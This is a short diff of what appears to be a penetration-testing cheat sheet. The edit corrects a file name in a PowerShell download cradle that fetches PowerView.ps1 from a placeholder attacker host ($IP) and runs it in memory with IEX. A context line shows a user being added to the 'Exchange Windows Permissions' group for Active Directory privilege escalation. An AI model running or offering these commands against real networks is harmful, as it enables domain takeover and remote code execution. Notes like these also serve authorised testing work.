@@ -39,5 +39,5 @@ net group "Exchange Windows Permissions" /add kickass101
 
 ##### Download files from server
 ```powershell
-IEX(New-Object Net.WebClient).downloadString('http://$IP/Powerview.ps1')
+IEX(New-Object Net.WebClient).downloadString('http://$IP/PowerView.ps1')
 ```
